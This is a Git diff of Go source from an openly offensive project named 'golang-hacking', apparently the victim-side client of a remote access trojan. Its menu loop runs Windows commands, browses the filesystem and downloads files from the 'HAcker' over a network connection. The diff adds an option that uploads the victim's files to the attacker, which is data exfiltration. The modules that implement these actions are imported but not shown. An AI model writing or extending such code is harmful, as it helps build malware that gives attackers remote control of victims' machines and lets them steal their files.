@@ -7,6 +7,7 @@ import (
 	"golang-hacking/VictimFinalVersion/core/ExecuteSystemCommandWindows"
 	"golang-hacking/VictimFinalVersion/core/Move"
 	"golang-hacking/VictimFinalVersion/core/handleConnection"
+	"golang-hacking/VictimFinalVersion/core/upload"
 	"log"
 	"strings"
 )
@@ -53,17 +54,26 @@ func main() {
 			fmt.Println("[+] Executing Commands on windows")
 			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
 			DisplayError(err)
+
 		case user_input == "2":
 			fmt.Println("[+] File system Navigation")
 			err = Move.NavigateFilesystem(connection)
 			DisplayError(err)
+
 		case user_input == "3":
 			fmt.Println("[+] Download File From Server/HAcker")
 			err = Download.ReadFileContents(connection)
 			DisplayError(err)
+
+		case user_input == "4":
+			fmt.Println("[+] Uploading File to the Hacker")
+			err = upload.Upload2Hacker(connection)
+			DisplayError(err)
+
 		case user_input == "99":
 			fmt.Println("[-] Exiting the windows program")
 			loopControl = false
+
 		default:
 			fmt.Println("[-] Invalid input, try again")
 		}
